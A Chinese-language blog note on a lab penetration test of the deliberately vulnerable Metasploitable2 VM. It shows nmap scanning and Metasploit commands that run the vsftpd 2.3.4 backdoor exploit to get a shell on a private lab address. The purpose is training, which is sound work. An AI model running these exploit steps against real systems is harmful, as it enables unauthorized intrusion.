---
title: 【資訊安全】Metasploitable2 滲透測試實作(筆記)
date: 2022-11-23
tags:
  - security
---

## 先備知識

- 知道如何使用 VMware 或 VirtualBox
- Kali Linux 基本操作
- 能夠讓 Kali 連線至 Metasploitable2

## Metasploitable2

一種充滿漏洞的Linux系統，適合用於練習滲透測試。

可直接到 [Sourceforge](https://sourceforge.net/projects/metasploitable/) 上下載虛擬機檔。

## 偵查

1. 開啟 Metasploitable2，會先要求輸入帳號密碼，帳密都是 `msfadmin` (輸入密碼時不會顯示在螢幕上)。

2. 輸入 `ifconfig` 查看 IP 位址，假設為 `192.168.235.130`。

3. 打開 Kali Linux (IP為192.168.235.128)，終端輸入 `msfconsole` 進入 Metasploit。

![msfconsole](/images/metasploitable2/kali_linux_msfconsole.png)

4. 使用 nmap 掃描可以連的 port

```bash
msf6 > nmap -sV 192.168.235.130
```

![nmap](/images/metasploitable2/kali_linux_msf_nmap.png)

可以看到有一大堆 port 是開著的

## 滲透

1. 看看 vsftpd 有沒有洞，在 msf 中輸入 `search vsftpd`，可以看到有一個 exploit 可以使用

![search vsftpd](/images/metasploitable2/kali_linux_msf_vsftpd.png)

2. 使用這個 exploit，用 `show options` 可以看到這個 exploit 需要的參數，然後用 `set 參數 值` 設定一些參數。

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.235.130
```

![use exploit](/images/metasploitable2/kali_linux_msf_exploit.png)

3. 設定 payload，即欲發送的惡意程式，我們使用 `payload/cmd/unix/interact`

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact
```

4. 輸入 `exploit` 開始攻擊

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

如果成功，可以試試 whoami、uname -a 之類的指令

![exploit](/images/metasploitable2/kali_linux_msf_exploit1.png)

---

Metasploitable2 還有很多其他的洞，之後有空來戳戳看或是玩 Metasploitable3。
